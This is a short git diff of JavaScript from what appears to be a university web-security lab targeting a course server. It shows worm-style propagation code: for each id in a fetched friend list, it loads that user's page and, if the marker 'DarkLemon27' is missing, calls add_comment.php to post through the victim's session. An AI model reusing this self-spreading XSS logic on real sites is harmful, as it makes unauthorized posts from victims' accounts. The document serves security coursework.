@@ -18,7 +18,7 @@ function moveitmoveit() {
     var eff = friend.responseText;
     var arr= eff.match('^[^<br]*').join().split(',');
     for( var i = 0; i < arr.length; i++){
-        var newhome = $.ajax({
+        /*var newhome = $.ajax({
             async: false,
             type: 'GET',
             data: { id: arr[i] },
@@ -26,8 +26,8 @@ function moveitmoveit() {
             success: function(data) {
                 return data;
             }
-        });
-        /*var newhome = $.get("http://csec380-core.csec.rit.edu:86/home.php",{id: arr[i]}, function(data){ 
+        });*/
+        var newhome = $.get("http://csec380-core.csec.rit.edu:86/home.php",{id: arr[i]}, function(data){ 
             if (JSON.stringify(data).match('DarkLemon27') == null){   
                 alert("Not here");
                 $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{
@@ -36,7 +36,7 @@ function moveitmoveit() {
                 });
             }
             return data; 
-        });*/
+        });
         
     }
     if(eff.match('159') == null){
